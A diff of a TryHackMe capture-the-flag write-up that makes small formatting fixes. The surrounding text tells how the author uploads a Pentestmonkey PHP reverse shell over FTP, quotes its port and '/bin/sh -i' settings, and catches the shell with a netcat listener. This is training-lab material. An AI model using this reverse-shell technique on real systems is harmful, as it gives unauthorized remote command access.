@@ -166,7 +166,8 @@ Given the credentials found, logging into the `ftp` is now possible.
 ❯ ftp <Machine-IP>
 ```
 A malicious PHP payload (`shell.php`) was generated using [Pentestmonkey](http://pentestmonkey.net/tools/php-reverse-shell). This payload was subsequently edited (`IP` and `PORT`) and uploaded to the target server via the FTP `put` command.
-* The IP in *TryHackMe network* is found by going to [10.10.10.10](10.10.10.10) or looking into vpn configurations.
+* The IP in *TryHackMe network* is found by going to [10.10.10.10](http://10.10.10.10) or looking into vpn configurations.
+
 ```bash
 From http://pentestmonkey.net/tools/php-reverse-shell 
 
@@ -175,6 +176,7 @@ $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $shell = 'uname -a; w; id; /bin/sh -i';
 ```
+
 ![Sending the shell of our own](/assets/images/h4cked/put.png)
 
 A `netcat` listener was established on the designated port to intercept the incoming *reverse shell* connection.
